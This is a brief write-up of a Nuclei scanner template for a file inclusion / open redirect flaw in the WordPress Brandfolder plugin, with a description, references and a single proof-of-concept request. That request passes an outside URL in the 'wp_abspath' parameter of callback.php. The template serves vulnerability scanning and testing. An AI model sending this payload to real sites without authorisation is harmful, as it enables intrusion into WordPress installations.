# Nuclei Template: WordPress Brandfolder - Open Redirect (RFI & LFI)
**Template ID:** brandfolder-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**Source:** Nuclei Template (`brandfolder-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Brandfolder is vulnerable to remote/local file inclusion and allows remote attackers to inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath' parameter which will redirect the victim to it.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/
```

## References
- https://www.exploit-db.com/exploits/39591
- https://wpscan.com/vulnerability/f850e182-f9c6-4264-b2b1-e587447fe4b1
